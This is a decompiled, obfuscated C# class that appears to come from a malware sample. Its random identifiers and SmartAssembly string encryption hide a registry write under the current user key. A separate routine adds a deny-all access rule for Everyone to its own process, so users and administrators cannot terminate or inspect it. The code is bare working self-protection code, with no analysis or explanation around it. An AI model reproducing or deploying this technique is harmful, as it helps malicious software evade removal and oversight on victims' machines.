using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KNpKkassJHAdE;

internal sealed class RpqNWOTrzSgX
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr GheclOfPmyAM, int ejEYSQVwWsghi, [Out] byte[] pXOBnIkUtrJ, uint pGYvixDQvytobe, out uint tJRNYEOjISkTWh);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr VTvqcJvlAeJouck, int RUnoJlcnQn, [In] byte[] YUVXhueUgYBnFhBku);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void gTDyhKlfPscHPqO(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107364605)));
			registryKey.SetValue(GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107364500)), getString_0(107366740));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor MmfTfECAQhlZLU(IntPtr intptr_0)
	{
		byte[] pXOBnIkUtrJ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, pXOBnIkUtrJ, 0u, out var tJRNYEOjISkTWh);
		if ((long)tJRNYEOjISkTWh > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, pXOBnIkUtrJ = new byte[tJRNYEOjISkTWh], tJRNYEOjISkTWh, out tJRNYEOjISkTWh))
		{
			return null;
		}
		return new RawSecurityDescriptor(pXOBnIkUtrJ, 0);
	}

	private void KokOtQqpLFrR(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void LHedWgvnujrcDnjl()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = MmfTfECAQhlZLU(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			KokOtQqpLFrR(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static RpqNWOTrzSgX()
	{
		Strings.CreateGetStringDelegate(typeof(RpqNWOTrzSgX));
	}
}
